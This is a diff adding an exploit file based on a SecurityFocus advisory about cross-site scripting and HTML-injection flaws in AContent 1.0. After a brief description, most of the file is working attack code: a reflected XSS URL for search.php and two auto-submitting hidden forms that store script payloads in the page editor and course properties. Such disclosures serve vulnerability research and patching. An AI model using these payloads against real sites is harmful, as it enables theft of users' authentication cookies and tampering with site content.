@@ -1,0 +1,53 @@
+source: http://www.securityfocus.com/bid/43238/info
+
+AContent is prone to multiple cross-site scripting vulnerabilities and an HTML-injection vulnerability because it fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.
+
+AContent 1.0 is vulnerable; prior versions may also be affected.
+
+http://www.example.com/home/search.php?search_text=txt"><script>alert(document.cookie)</script>&catid=&search=Search
+
+
+<form action="http://www.example.com/home/editor/edit_content.php?_cid=PAGE_ID" method="post" name="main" enctype="multipart/form-data" >
+
+<input type="hidden" name="_course_id" value="54" />
+<input type="hidden" name="_cid" value="PAGE_ID" />
+<input type="hidden" name="title" value="page title" />
+<input type="hidden" name="ordering" value="1" />
+<input type="hidden" name="pid" value="0" />
+<input type="hidden" name="alternatives" value="" />
+<input type="hidden" name="current_tab" value="0" />
+<input type="hidden" name="keywords" value="" />
+<input type="hidden" name="test_message" value="" />
+<input type="submit" name="submit" id="sbmtit" value="Save" />
+<input type="hidden" name="displayhead" value="0" />
+<input type="hidden" name="displaypaste" value="0" />
+<input type="hidden" name="complexeditor" value="1" />
+<input type="hidden" name="title" value="atest ah" />
+<input type="hidden" name="formatting" value="1" />
+<input type="hidden" name="head" value="" />
+<input type="hidden" name="uploadedfile_paste" value="" />
+<input type="hidden" name="body_text" value='hello world html<script>alert(document.cookie)</script>' />
+<input type="hidden" name="weblink_text" value="" />
+
+</form>
+<script>
+document.getElementById('sbmtit').click();
+</script>
+
+
+<form action="http://www.example.com/home/course/course_property.php?_course_id=COURSE_ID" method="post" name="main" enctype="multipart/form-data" >
+
+<input type="hidden" name="_course_id" value="COURSE_ID" />
+<input type="hidden" name="title" value="Creating Lesson in AContent" />
+<input type="hidden" name="category_id" value="0" />
+<input type="hidden" name="pri_lang" value="en" />
+<input type="hidden" name="description" value="Learn how to" />
+<input type="hidden" name="copyright" value='1"><script>alert(document.cookie)</script>' />
+<input type="submit" name="submit" id="sbmtit" value="Save" />
+
+</form>
+<script>
+document.getElementById('sbmtit').click();
+</script>
